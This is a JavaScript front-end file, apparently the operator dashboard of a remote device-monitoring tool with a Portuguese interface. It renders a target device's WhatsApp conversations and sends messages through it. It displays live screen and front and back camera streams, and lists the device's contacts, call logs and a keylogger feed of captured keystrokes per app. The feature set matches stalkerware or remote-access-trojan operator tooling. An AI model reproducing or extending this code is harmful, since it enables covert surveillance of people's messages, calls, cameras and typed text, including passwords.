        <div class="wa-bubble-meta">
            ${sourceBadge}
            <span class="wa-bubble-time">${time}</span>
            ${tick}
        </div>`;

    if (mediaType === 'audio' && mediaUrl) {
        const audioEl = bubble.querySelector('.wa-bubble-audio');
        // Fallback for old files uploaded with a wrong Content-Type (e.g. audio/opus),
        // or CORS/redirect issues: fetch as blob so the browser can decode it locally.
        audioEl.addEventListener('error', async () => {
            try {
                const resp = await fetch(mediaUrl, { headers: authHeaders() });
                if (resp.ok) {
                    const blob = await resp.blob();
                    const playableBlob = blob.type && blob.type !== 'audio/opus'
                        ? blob
                        : new Blob([blob], { type: 'audio/ogg; codecs=opus' });
                    audioEl.src = URL.createObjectURL(playableBlob);
                    audioEl.load();
                } else {
                    audioEl.outerHTML = `<a href="${escapeHtml(mediaUrl)}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
                }
            } catch {
                audioEl.outerHTML = `<a href="${escapeHtml(mediaUrl)}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
            }
        }, { once: true });
    }

    return bubble;
}

function waFormatPhone(addr) {
    if (addr === '(sistema)') return '⚙ Sistema';
    const digits = addr.replace(/\D/g, '');
    if (digits.length === 13 && digits.startsWith('55')) {
        return `+55 (${digits.slice(2,4)}) ${digits.slice(4,9)}-${digits.slice(9)}`;
    }
    if (digits.length === 12 && digits.startsWith('55')) {
        return `+55 (${digits.slice(2,4)}) ${digits.slice(4,8)}-${digits.slice(8)}`;
    }
    if (digits.length === 11) {
        return `(${digits.slice(0,2)}) ${digits.slice(2,7)}-${digits.slice(7)}`;
    }
    if (digits.length === 10) {
        return `(${digits.slice(0,2)}) ${digits.slice(2,6)}-${digits.slice(6)}`;
    }
    return addr;
}

function waFilter(query) {
    const q = query.toLowerCase();
    document.querySelectorAll('.wa-conv-item').forEach(el => {
        const name = el.querySelector('.wa-conv-name')?.textContent.toLowerCase() || '';
        const subtitle = el.querySelector('.wa-conv-subtitle')?.textContent.toLowerCase() || '';
        const preview = el.querySelector('.wa-conv-preview')?.textContent.toLowerCase() || '';
        el.style.display = (!q || name.includes(q) || subtitle.includes(q) || preview.includes(q)) ? '' : 'none';
    });
}

function sendMessage() {
    const input = document.getElementById('message-input');
    if (!input) return;
    const text = input.value.trim();
    if (!text || !currentDeviceId) {
        if (!currentDeviceId) logToConsole('Nenhum dispositivo selecionado!', 'error');
        return;
    }
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify({ command: 'SEND_MESSAGE', deviceId: currentDeviceId, message: text }));
        input.value = '';
    } else {
        logToConsole('Sem conexão com o servidor!', 'error');
    }
}

// ─── Simple markdown formatter ────────────────────────────────────────────────

// Simple markdown formatter helper for bold, bullet points, and code blocks
function formatMarkdown(text) {
    let html = escapeHtml(text);
    
    // Bold: **text**
    html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    
    // Bullet points: * text or - text
    html = html.replace(/^\s*[\*\-]\s+(.*?)$/gm, '<li>$1</li>');
    html = html.replace(/(<li>.*?<\/li>)/gs, '<ul>$1</ul>');
    // Remove duplicate consecutive <ul> tags
    html = html.replace(/<\/ul>\s*<ul>/g, '');
    
    // Newlines
    html = html.replace(/\n/g, '<br>');

    return html;
}

// ── Fullscreen stream modal ────────────────────────────────────────────────────
function openFullscreen(type) {
    currentFsType = type;
    const modal = document.getElementById('fullscreen-modal');
    const fsImg = document.getElementById('fs-stream-img');
    const fsPh  = document.getElementById('fs-placeholder');
    const fsTitle = document.getElementById('fs-title');
    const fsInfo  = document.getElementById('fs-info');

    const titles = { screen: '🖥️ Tela ao Vivo', front: '📷 Câmera Frontal', back: '📸 Câmera Traseira' };
    if (fsTitle) fsTitle.innerHTML = `<i class="fa-solid fa-video"></i> ${titles[type] || 'Transmissão'}`;

    // Copy current frame to fullscreen
    let srcImg = null;
    if (type === 'screen') srcImg = document.getElementById('screen-stream-img');
    else if (type === 'front') srcImg = document.getElementById('cam-stream-img');
    else if (type === 'back')  srcImg = document.getElementById('cam-back-stream-img');

    if (srcImg && srcImg.src && srcImg.style.display !== 'none') {
        fsImg.src = srcImg.src;
        fsImg.style.display = 'block';
        if (fsPh) fsPh.style.display = 'none';
    } else {
        fsImg.src = '';
        fsImg.style.display = 'none';
        if (fsPh) fsPh.style.display = 'flex';
    }

    if (fsInfo) {
        const isLive = (type === 'screen' && isScreenStreaming) || (type !== 'screen' && isCameraStreaming && activeCameraType === type);
        fsInfo.textContent = isLive ? '● Transmissão ao vivo — clique fora ou ESC para sair' : 'Stream offline — inicie a transmissão primeiro';
    }

    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';

    // Try native fullscreen API
    if (modal.requestFullscreen) modal.requestFullscreen().catch(() => {});
    else if (modal.webkitRequestFullscreen) modal.webkitRequestFullscreen();
}

function closeFullscreen() {
    currentFsType = null;
    const modal = document.getElementById('fullscreen-modal');
    modal.style.display = 'none';
    document.body.style.overflow = '';

    if (document.fullscreenElement) document.exitFullscreen().catch(() => {});
    else if (document.webkitFullscreenElement) document.webkitExitFullscreen();
}

function updateFsFrame(url) {
    if (!currentFsType) return;
    const fsImg = document.getElementById('fs-stream-img');
    const fsPh  = document.getElementById('fs-placeholder');
    if (fsImg) { fsImg.src = url; fsImg.style.display = 'block'; }
    if (fsPh)  fsPh.style.display = 'none';
}

function fsStopStream() {
    if (!currentFsType) return;
    if (currentFsType === 'screen') { toggleScreenStream(); }
    else { toggleCameraStream(currentFsType); }
    closeFullscreen();
}

function togglePiP() {
    const fsImg = document.getElementById('fs-stream-img');
    if (fsImg && document.pictureInPictureEnabled) {
        // PiP works on video elements; show a toast instead
        alert('PiP requer elemento de vídeo. Use a tela cheia nativa do navegador (F11).');
    }
}

// ESC key closes fullscreen modal
document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && currentFsType) closeFullscreen();
});

// Handle browser native fullscreen exit (user pressed ESC on native FS)
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement && currentFsType) {
        const modal = document.getElementById('fullscreen-modal');
        if (modal && modal.style.display !== 'none') closeFullscreen();
    }
});


// ═══════════════════════════════════════════════════════════════════════════
// CONTACTS
// ═══════════════════════════════════════════════════════════════════════════
let _allContacts = [];

function fetchContacts(deviceId) {
    const id = deviceId || currentDeviceId;
    if (!id) return;
    fetch(`/api/device/${id}/contacts`, { headers: authHeaders() })
        .then(r => r.json())
        .then(rows => { if (id === currentDeviceId) contactsRender(rows); })
        .catch(e => console.error('fetchContacts:', e));
}

function contactsRender(rows) {
    _allContacts = rows;
    contactsApplyFilter(document.getElementById('contacts-search')?.value || '');
}

function contactsFilter(q) { contactsApplyFilter(q); }

function contactsApplyFilter(q) {
    const list  = document.getElementById('contacts-list');
    const empty = document.getElementById('contacts-empty');
    if (!list) return;
    const lq = (q || '').toLowerCase();
    const data = lq ? _allContacts.filter(c =>
        c.name.toLowerCase().includes(lq) || c.phone.toLowerCase().includes(lq)
    ) : _allContacts;

    if (data.length === 0) {
        list.style.display = 'none';
        empty.style.display = '';
        empty.innerHTML = `<i class="fa-solid fa-address-book fa-2x"></i><p>${_allContacts.length === 0 ? 'Selecione um dispositivo e clique em Sync' : 'Nenhum contato encontrado'}</p>`;
        return;
    }
    list.style.display = '';
    empty.style.display = 'none';
    list.innerHTML = data.map(c => {
        const initials = (c.name || '?').split(' ').slice(0,2).map(w => w[0]).join('').toUpperCase();
        const color = contactAvatarColor(c.name);
        return `<li class="contact-item">
            <div class="contact-avatar" style="background:${color}">${escapeHtml(initials)}</div>
            <div class="contact-info">
                <span class="contact-name">${escapeHtml(c.name || '—')}</span>
                <span class="contact-phone">${escapeHtml(c.phone)}</span>
            </div>
        </li>`;
    }).join('');
}

function contactAvatarColor(name) {
    const colors = ['#4f8ef7','#25d366','#e1306c','#f7b731','#a29bfe','#fd79a8','#00b894','#6c5ce7'];
    let h = 0;
    for (let i = 0; i < (name||'').length; i++) h = ((h << 5) - h) + name.charCodeAt(i);
    return colors[Math.abs(h) % colors.length];
}

// ═══════════════════════════════════════════════════════════════════════════
// CALL LOGS
// ═══════════════════════════════════════════════════════════════════════════
function fetchCallLogs(deviceId) {
    const id = deviceId || currentDeviceId;
    if (!id) return;
    fetch(`/api/device/${id}/call-logs`, { headers: authHeaders() })
        .then(r => r.json())
        .then(rows => { if (id === currentDeviceId) calllogsRender(rows); })
        .catch(e => console.error('fetchCallLogs:', e));
}

function calllogsRender(rows) {
    const list  = document.getElementById('calllogs-list');
    const empty = document.getElementById('calllogs-empty');
    if (!list) return;
    if (!rows || rows.length === 0) {
        list.style.display = 'none';
        empty.style.display = '';
        return;
    }
    list.style.display = '';
    empty.style.display = 'none';
    list.innerHTML = rows.map(c => {
        const typeIcon = {
            incoming: '<i class="fa-solid fa-phone-arrow-down-left cl-incoming"></i>',
            outgoing: '<i class="fa-solid fa-phone-arrow-up-right cl-outgoing"></i>',
            missed:   '<i class="fa-solid fa-phone-missed cl-missed"></i>',
            rejected: '<i class="fa-solid fa-phone-slash cl-missed"></i>',
        }[c.type] || '<i class="fa-solid fa-phone cl-incoming"></i>';
        const dur = c.duration > 0 ? fmtDuration(c.duration) : '—';
        const date = new Date(c.timestamp).toLocaleString('pt-BR');
        return `<li class="cl-item">
            <span class="cl-icon">${typeIcon}</span>
            <div class="cl-info">
                <span class="cl-name">${escapeHtml(c.name || c.number)}</span>
                <span class="cl-sub">${escapeHtml(c.number)} · ${date}</span>
            </div>
            <span class="cl-dur">${dur}</span>
        </li>`;
    }).join('');
}

function fmtDuration(secs) {
    if (!secs) return '0s';
    const m = Math.floor(secs / 60), s = secs % 60;
    return m > 0 ? `${m}m ${s}s` : `${s}s`;
}

// ═══════════════════════════════════════════════════════════════════════════
// KEYLOG
// ═══════════════════════════════════════════════════════════════════════════
let _allKeylog = [];

function fetchKeylog(deviceId) {
    const id = deviceId || currentDeviceId;
    if (!id) return;
    fetch(`/api/device/${id}/keylog`, { headers: authHeaders() })
        .then(r => r.json())
        .then(rows => {
            if (id !== currentDeviceId) return;
            _allKeylog = rows;
            keylogApplyFilter(document.getElementById('keylog-search')?.value || '');
        })
        .catch(e => console.error('fetchKeylog:', e));
}

function keylogAppend(data) {
    _allKeylog.unshift({
        app: data.app, appLabel: data.appLabel,
        text: data.text, timestamp: data.timestamp
    });
    if (_allKeylog.length > 1000) _allKeylog.pop();
    keylogApplyFilter(document.getElementById('keylog-search')?.value || '');
}

function keylogFilter(q) { keylogApplyFilter(q); }

function keylogApplyFilter(q) {
    const list  = document.getElementById('keylog-list');
    const empty = document.getElementById('keylog-empty');
    if (!list) return;
    const lq = (q || '').toLowerCase();
    const data = lq ? _allKeylog.filter(k =>
        (k.appLabel || k.app || '').toLowerCase().includes(lq) ||
        (k.text || '').toLowerCase().includes(lq)
    ) : _allKeylog;

    if (data.length === 0) {
        list.style.display = 'none';
        empty.style.display = '';
        return;
    }
    list.style.display = '';
    empty.style.display = 'none';
    list.innerHTML = data.map(k => {
        const date = new Date(k.timestamp).toLocaleString('pt-BR');
        const label = escapeHtml(k.appLabel || k.app || 'Desconhecido');
        return `<li class="kl-item">
            <div class="kl-header">
                <span class="kl-app">${label}</span>
                <span class="kl-time">${date}</span>
            </div>
            <span class="kl-text">${escapeHtml(k.text)}</span>
        </li>`;
    }).join('');
}

function clearKeylogPanel() {
    _allKeylog = [];
    keylogApplyFilter('');
    const input = document.getElementById('keylog-search');
    if (input) input.value = '';
}
